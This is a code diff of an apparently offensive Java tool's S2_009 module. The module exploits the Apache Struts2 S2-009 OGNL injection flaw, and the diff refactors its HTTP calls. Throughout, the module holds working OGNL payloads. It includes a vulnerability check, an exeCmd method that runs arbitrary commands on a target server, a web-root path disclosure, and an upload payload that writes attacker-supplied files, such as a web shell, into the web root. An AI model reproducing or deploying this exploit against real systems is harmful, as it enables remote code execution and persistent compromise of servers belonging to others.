@@ -1,9 +1,12 @@
 package fun.fireline.exp.apache.struts2;
 
 import fun.fireline.core.ExploitInterface;
-import fun.fireline.tools.HttpTool;
+import fun.fireline.tools.HttpTools;
+import fun.fireline.tools.Response;
+import fun.fireline.tools.Tools;
 
 import java.net.URLEncoder;
+import java.util.HashMap;
 import java.util.UUID;
 
 /**
@@ -17,7 +20,7 @@ public class S2_009 implements ExploitInterface {
 
     private String target = null;
     private boolean isVul = false;
-
+    private HashMap<String, String> headers = new HashMap();
 
     private String payload = "class.classLoader.jarPath=%28%23context[%22xwo" +
             "rk.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boo" +
@@ -35,46 +38,38 @@ public class S2_009 implements ExploitInterface {
     private String webPath = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i97)(('\\43xman.getWriter().println(\\43req.getRealPath(\"\\u005c\"))')(d))&(i99)(('\\43xman.getWriter().close()')(d))";
 
     @Override
-    public boolean checkVul(String url) {
+    public String checkVul(String url) {
         String uuid =  UUID.randomUUID().toString();
+
         this.target = url;
-        try {
-            String data = this.payload.replace("payload", "echo " + uuid);
-            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, "UTF-8");
-            boolean flag = result.contains(uuid);
-            if(flag) {
-                this.isVul = true;
-            }
-            return flag;
-        } catch (Exception e) {
-            logger.error(e);
+        this.headers.put("Content-type", "application/x-www-form-urlencoded");
+        String data = this.payload.replace("payload", "echo " + uuid);
+        Response response = HttpTools.post(this.target, data, this.headers, "UTF-8");
+
+        if(response.getText() != null  && response.getText().contains(uuid)) {
+            this.isVul = true;
+            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
+        } else if (response.getError() != null) {
+            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
+        } else {
+            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
         }
-        return false;
+
     }
 
     @Override
     public String exeCmd(String cmd, String encoding) {
-        try {
-            String data = this.payload.replace("payload", cmd);
-            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, encoding);
-            return result;
 
-        } catch (Exception e) {
-            logger.error(e);
-        }
-        return "fail";
+        String data = this.payload.replace("payload", cmd);
+        this.headers.put("Content-type", "application/x-www-form-urlencoded");
+        Response response = HttpTools.post(this.target, data, headers, encoding);
+        return Tools.regReplace(response.getText());
     }
 
     @Override
     public String getWebPath() {
-        try {
-            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", webPath, "UTF-8");
-            return result;
-
-        } catch (Exception e) {
-            logger.error(e);
-        }
-        return "命令执行失败";
+        Response response = HttpTools.post(this.target, webPath, headers, "UTF-8");
+        return response.getText();
     }
 
     @Override
@@ -85,7 +80,10 @@ public class S2_009 implements ExploitInterface {
 
         String payload = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(%22false%22)))=&(i1)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))=&(i12)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i13)(('\\43xman.getWriter().println(\\43req.getServletContext().getRealPath(%22\\u005c%22))')(d))=&(i2)(('\\43fos\\75new\\40java.io.FileOutputStream(new\\40java.lang.StringBuilder(\\43req.getRealPath(%22\\u005c%22)).append(%22/" + filename + "%22).toString())')(d))=&(i3)(('\\43fos.write(\\43req.getParameter(%22t%22).getBytes())')(d))=&(i4)(('\\43fos.close()')(d))(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i95)(('\\43xman.getWriter().print(\"" + uuid+ "\")')(d))=&(i99)(('\\43xman.getWriter().close()')(d))=&t=" + fileContent;
 
-        String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", payload, "UTF-8");
+        this.headers.put("Content-type", "application/x-www-form-urlencoded");
+        Response response = HttpTools.post(this.target, payload, headers, "UTF-8");
+
+        String result = response.getText();
 
         if(result.contains(uuid)) {
             result = result + "  上传成功! ";
